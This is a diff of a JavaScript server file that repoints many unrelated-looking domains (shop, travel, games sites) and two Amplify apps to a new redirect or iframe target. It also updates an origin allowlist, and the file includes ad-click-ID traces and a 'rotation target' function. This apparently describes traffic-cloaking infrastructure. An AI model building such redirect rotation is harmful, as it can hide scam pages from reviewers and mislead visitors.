@@ -85,20 +85,20 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairyfarmshop.netlify.app": { method: "redirect", target: "https://main.d23kw2slxqg6v4.amplifyapp.com" },
-    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.d23kw2slxqg6v4.amplifyapp.com" },
-    "https://hiroakitravels.com": { method: "redirect", target: "https://main.d23kw2slxqg6v4.amplifyapp.com" },
-    "https://teruogames.org": { method: "redirect", target: "https://main.d23kw2slxqg6v4.amplifyapp.com" },
-    "https://ikitalks.fun": { method: "redirect", target: "https://main.d23kw2slxqg6v4.amplifyapp.com" },
-    "https://naokidminos.shop": { method: "redirect", target: "https://main.d23kw2slxqg6v4.amplifyapp.com" },
+    "https://naotoshidairyfarmshop.netlify.app": { method: "redirect", target: "https://main.dcswohq9pqi7i.amplifyapp.com" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.dcswohq9pqi7i.amplifyapp.com" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://main.dcswohq9pqi7i.amplifyapp.com" },
+    "https://teruogames.org": { method: "redirect", target: "https://main.dcswohq9pqi7i.amplifyapp.com" },
+    "https://ikitalks.fun": { method: "redirect", target: "https://main.dcswohq9pqi7i.amplifyapp.com" },
+    "https://naokidminos.shop": { method: "redirect", target: "https://main.dcswohq9pqi7i.amplifyapp.com" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
-    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://main.d23kw2slxqg6v4.amplifyapp.com" },
-    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://main.d23kw2slxqg6v4.amplifyapp.com" },
+    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://main.dcswohq9pqi7i.amplifyapp.com" },
+    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://main.dcswohq9pqi7i.amplifyapp.com" },
   },
   aomine: {
-    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://main.d23kw2slxqg6v4.amplifyapp.com" },
+    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://main.dcswohq9pqi7i.amplifyapp.com" },
   },
 };
 
@@ -677,7 +677,7 @@ app.get("/fetchPrank", (req, res) => {
 function isAuthorized(req) {
   // Replace with whatever "who is requesting" check you want.
   // Simple Netlify-origin allowlist:
-  const allowed = ["https://main.d23kw2slxqg6v4.amplifyapp.com"];
+  const allowed = ["https://main.dcswohq9pqi7i.amplifyapp.com"];
   return allowed.includes(req.get("origin"));
 }
 
